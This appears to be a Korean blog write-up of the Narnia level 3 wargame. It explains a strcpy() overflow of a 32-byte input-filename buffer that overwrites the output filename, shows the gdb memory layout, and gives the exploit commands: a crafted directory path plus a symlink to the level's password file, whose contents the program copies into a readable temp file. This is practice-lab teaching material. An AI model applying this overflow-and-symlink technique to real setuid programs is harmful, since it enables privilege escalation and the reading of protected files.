## 1. 문제 확인
- ID : narnia3
- Target : /narnia/narnia3
- Flag : /etc/narnia_pass/narnia4
```
narnia3@gibson:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
```

<br/><br/>
## 2. 취약점 분석
### 2.1 Source Code
- 프로그램 실행 인자로 특정 파일을 입력하면 해당 파일을 읽어서 /dev/null 로 복사 후 종료함
![](https://velog.velcdn.com/images/g4nzzi/post/57739ffa-e50e-469e-bc6f-6b64bdbd0679/image.png)
### 2.2 Code 분석
- ifile 사이즈는 32byte이고, strcpy()로 복사할 때 사이즈 제한이 없으므로 실행 인자값을 32byte 이상 입력하면 ofile 값까지 덮어쓸 수 있을 듯 함
![](https://velog.velcdn.com/images/g4nzzi/post/8b7e4b23-81c9-40b7-bbfb-068ffac6caf6/image.png)
- gdb로 메모리 위치를 확인해 보니 정확하게 ifile 32byte 이후 ofile(/dev/null) 이 위치함
```
	(gdb) r NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
	Starting program: /narnia/narnia3 NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
	...
        (gdb) x/100s $ebp-0x38
	0xffffd350:     'N' <repeats 32 times>
	0xffffd371:     "dev/null"
	0xffffd37a:     ""
	...
```

<br/><br/>
## 3. Exploit
- ofile 값으로 덮어쓸 임시파일을 생성
```
	narnia3@gibson:/narnia$ touch /tmp/g4nzzi
	narnia3@gibson:/narnia$ chmod 777 /tmp/g4nzzi
```
- ifile 값을 32byte로 채울 임시 경로를 생성
```
	narnia3@gibson:/narnia$ mkdir /tmp/NNNNNNNNNNNNNNNNNNNNNNNNNNN
	narnia3@gibson:/narnia$ mkdir /tmp/NNNNNNNNNNNNNNNNNNNNNNNNNNN/tmp
```
- flag(/etc/narnia_pass/narnia4)를 읽기내기 위해 심볼릭 링크로 임시파일에 연결
```
	narnia3@gibson:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/NNNNNNNNNNNNNNNNNNNNNNNNNNN/tmp/g4nzzi
```
- 프로그램 실행 시 심볼릭 링크를 실행 인자[32byte + 임시파일]로 입력하면 /dev/null 대신 임시파일에 flag값이 복사됨
```
    narnia3@gibson:/narnia$ ./narnia3 /tmp/NNNNNNNNNNNNNNNNNNNNNNNNNNN/tmp/g4nzzi
    copied contents of /tmp/NNNNNNNNNNNNNNNNNNNNNNNNNNN/tmp/g4nzzi to a safer place... (/tmp/g4nzzi)
    narnia3@gibson:/narnia$ cat /tmp/g4nzzi
```
